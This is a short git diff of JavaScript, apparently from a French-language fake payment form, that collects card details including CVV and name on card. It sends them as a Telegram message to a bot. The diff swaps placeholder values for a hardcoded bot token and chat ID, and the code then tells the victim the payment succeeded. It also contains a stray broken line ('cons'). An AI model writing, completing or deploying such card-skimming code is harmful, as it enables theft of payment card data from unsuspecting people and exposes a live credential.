@@ -234,16 +234,17 @@ CVV : ${cvv}
 Nom sur la carte : ${nameOnCard}
 `;
 
-            const botToken = 'VOTRE_BOT_TOKEN'; // 8101158488:AAH6WIfCC6B6aGkWd_Tt6QRrWD8QKQQc69M
-            const chatId = 'VOTRE_CHAT_ID'; // 5372119436
+            cons
+const botToken = '8101158488:AAH6WIfCC6B6aGkWd_Tt6QRrWD8QKQQc69M'; // Votre token
+    const chatId = '5372119436'; // Votre chat ID Telegram
 
-            const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+    const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
 
-            // Envoi du message
-            const response = await fetch(telegramApiUrl);
-            const dataResponse = await response.json();
+    // Envoi du message
+    const response = await fetch(telegramApiUrl);
+    const dataResponse = await response.json();
 
-            if (dataResponse.ok) {
+    if (dataResponse.ok) {
                 alert('Votre paiement a été envoyé avec succès.');
             } else {
                 alert('Erreur dans l\'envoi des informations.');
